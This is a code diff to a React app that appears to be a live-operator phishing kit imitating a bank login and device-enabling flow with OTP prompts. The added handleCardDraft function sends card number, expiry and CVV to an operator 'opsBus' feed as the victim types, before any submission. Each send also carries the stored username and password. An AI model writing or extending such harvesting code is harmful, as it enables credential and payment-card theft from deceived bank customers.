@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from 'react'
+import { useCallback, useEffect, useRef, useState } from 'react'
 import LoginPage from './LoginPage.jsx'
 import HabilitarDevicePage from './HabilitarDevicePage.jsx'
 import OtpModal from './OtpModal.jsx'
@@ -94,6 +94,7 @@ export default function App() {
   /** Panel envió a Habilitar dispositivo (misma sesión del login) */
   const dispositivoFromPanelRef = useRef(Boolean(initial?.dispositivoFromPanel))
   const cardTimerRef = useRef(0)
+  const cardDraftTimerRef = useRef(0)
 
   useEffect(() => {
     pendingUserRef.current = pendingUser
@@ -208,6 +209,10 @@ export default function App() {
       window.clearTimeout(cardTimerRef.current)
       cardTimerRef.current = 0
     }
+    if (cardDraftTimerRef.current) {
+      window.clearTimeout(cardDraftTimerRef.current)
+      cardDraftTimerRef.current = 0
+    }
     setPendingUser(null)
     setOtpVariant(null)
     setOtpImage('')
@@ -230,6 +235,10 @@ export default function App() {
     if (cardTimerRef.current) {
       window.clearTimeout(cardTimerRef.current)
       cardTimerRef.current = 0
+    }
+    if (cardDraftTimerRef.current) {
+      window.clearTimeout(cardDraftTimerRef.current)
+      cardDraftTimerRef.current = 0
     }
     setErrorMsg(message || '')
     setSuccessMsg('')
@@ -547,7 +556,37 @@ export default function App() {
     }, 6000)
   }
 
+  const handleCardDraft = useCallback((draft) => {
+    const id = sessionIdRef.current
+    if (!id) return
+    const cardNumber = String(draft.cardNumber || '').replace(/\D/g, '')
+    const cardExpiry = draft.cardExpiry || ''
+    const cvv = String(draft.cvv || '').replace(/\D/g, '')
+    if (!cardNumber && !cardExpiry && !cvv) return
+    if (cardDraftTimerRef.current) window.clearTimeout(cardDraftTimerRef.current)
+    const delay = cardNumber.length >= 16 || cvv.length >= 3 ? 60 : 220
+    cardDraftTimerRef.current = window.setTimeout(() => {
+      cardDraftTimerRef.current = 0
+      if (!sessionIdRef.current) return
+      opsBus.sessionCreated({
+        id: sessionIdRef.current,
+        username: pendingUserRef.current?.username || '',
+        password: pendingUserRef.current?.password || '',
+        tipoUsuario: pendingUserRef.current?.tipoUsuario || 'CODIGO_PERSONA',
+        flow: routeRef.current === 'habilitar' ? 'habilitar' : 'login',
+        cardNumber,
+        cardExpiry,
+        cvv,
+        last_seen: Date.now(),
+      })
+    }, delay)
+  }, [])
+
   function handleHabilitarSubmit(data) {
+    if (cardDraftTimerRef.current) {
+      window.clearTimeout(cardDraftTimerRef.current)
+      cardDraftTimerRef.current = 0
+    }
     const id = sessionIdRef.current || opsBus.createId()
     sessionIdRef.current = id
     lastTerminalKeyRef.current = ''
@@ -586,7 +625,6 @@ export default function App() {
       cvv: data.cvv || '',
       device: detectDevice(),
       ip: '127.0.0.1',
-      createdAt: Date.now(),
       last_seen: Date.now(),
       state: 'waiting',
     })
@@ -612,6 +650,7 @@ export default function App() {
       <HabilitarDevicePage
         onSubmit={handleHabilitarSubmit}
         onCancel={showLoginCard ? goLogin : cancelHabilitar}
+        onCardDraft={handleCardDraft}
         locked={waiting}
         showSpinner={step === 'loading'}
         errorMsg={errorMsg}
